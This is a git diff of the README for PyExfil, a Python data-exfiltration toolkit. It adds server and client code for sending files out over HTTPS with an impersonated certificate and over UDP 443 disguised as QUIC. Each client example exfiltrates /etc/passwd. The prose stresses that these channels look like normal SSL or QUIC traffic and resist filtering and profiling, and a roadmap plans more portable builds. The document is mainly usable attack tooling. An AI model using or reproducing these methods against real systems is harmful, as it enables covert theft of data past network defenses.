@@ -8,7 +8,8 @@ This started as a PoC project but has later turned into something a bit more. Cu
 * ICMP (8).
 * NTP requests.
 * BGP Open.
-* HTTPS Replace Certificate
+* HTTPS Replace Certificate.
+* QUIC - No Certificate.
 * POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
 * FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
 
@@ -23,10 +24,7 @@ This will allow establish of a listener on a DNS server to grab incoming DNS que
 ### HTTPS Replace certificate
 With this method you are configuring an HTTP server to impersonate the certificate. When you exfiltrate data, it will use the original server to exchange certificates with the duplicating server (port forwarding) and then, when this is complete, transmit the data with AES encryption but wraps it up as SSL Application Data as there is no real way of telling this.
 
-### HTTP Cookie
-Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter.
-
-#### Server Setup
+#### Server Setup - String Mode
 ```python
 from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer
 
@@ -34,7 +32,7 @@ server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_conn
 server.startlistening()
 ```
 
-#### Client Setup
+#### Client Setup - String Mode
 ```python
 from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient
 
@@ -44,6 +42,26 @@ client.sendData("DEFG")
 client.close()
 ```
 
+#### Server Setup - File Mode
+```python
+from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer
+
+server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192, file_mode=True)
+server.startlistening()
+```
+
+#### Client Setup - File Mode
+```python
+from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient
+
+client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
+client.sendFile("/etc/passwd")
+client.close()
+```
+
+
+### HTTP Cookie
+Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter.
 
 ### ICMP
 Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.
@@ -70,6 +88,34 @@ FTPHand = GetContent()
 FTPHand.get_file()
 ```
 
+### QUIC
+In this method, we exfiltrate files over UDP 443 as to look like QUIC. Currently, it is written as first PoC and less as a functional tool. For example, will only work with one file at a time and not concurrent. Vailidy only checks MD5 and not individual packets (server does not request missing chunks from client, which it should). Nevertheless, this seems to work fine in several checks we've done and seems viable exfiltration for single file.
+
+In the future, we should add the things mentioned above. Currently, this does not seem like there is a profiling that can be done on these streams as they appear to be identified by all interceptors as QUIC and unresolvable to the content (while QUIC uses true SSL, this uses AES which still gives a binary blob which is meaningless).
+
+#### Server
+```python
+from pyexfil.QUIC.quic_server import HTTPSExfiltrationServer
+
+server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
+server.startlistening()
+```
+
+#### Client
+```python
+from pyexfil.QUIC.quic_client import QUICClient
+
+client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server
+
+# This part is just for debugging and printing, no read use
+a = struct.unpack('<LL', client.sequence)                       # Get CID used
+a = (a[1] << 32) + a[0]
+sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)
+
+client.sendFile("/etc/passwd")                                  # Exfil File
+client.close()
+```
+
 ## Future Stuff
 ### Version Alpha
 - [X] Check why HTTP Cookie exfiltration keeps failing CRC checks. (Fixed in patch #7 by Sheksa)
@@ -85,7 +131,8 @@ FTPHand.get_file()
 
 ### Version 1.0
 - [ ] Enable simultaneous support for all data exfiltration methods.
-- [ ] Translate module to C Windows.
+- [ ] Unify all to a single platform.
+- [ ] Testing for py2exe support.
 - [ ] Translate module to C Linux.
 - [ ] Get a damn logo :)
 
